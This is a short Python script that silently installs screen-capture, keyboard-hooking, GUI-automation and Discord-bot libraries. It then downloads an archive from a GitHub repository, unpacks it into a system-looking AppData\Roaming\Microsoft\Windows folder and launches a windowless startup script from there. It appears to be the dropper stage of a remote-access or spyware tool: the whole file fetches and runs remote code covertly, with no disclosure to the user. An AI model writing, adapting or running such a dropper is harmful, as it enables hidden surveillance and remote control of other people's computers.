import os
import subprocess
import sys
import time
import zipfile
from pathlib import Path

required_packages = [
    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
    'pyautogui', 'Pillow', 'nextcord', 'requests',
    'keyboard', 'python-dateutil', 'pywin32', 'pypiwin32'
]

required_package = [
    'setuptools'
]

def install_package():
    for package in required_package:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])


def install_packages():
    for package in required_packages:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

install_package()
install_packages()

time.sleep(3)

import requests
import win32com.client

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
open(file_path, 'wb').write(r.content)
with zipfile.ZipFile(file_path, 'r') as zip_ref:
    zip_ref.extractall(target_path)
os.remove(file_path)

process = subprocess.Popen(["python", os.path.join(target_path, "skibidi-startup", "startup.pyw")])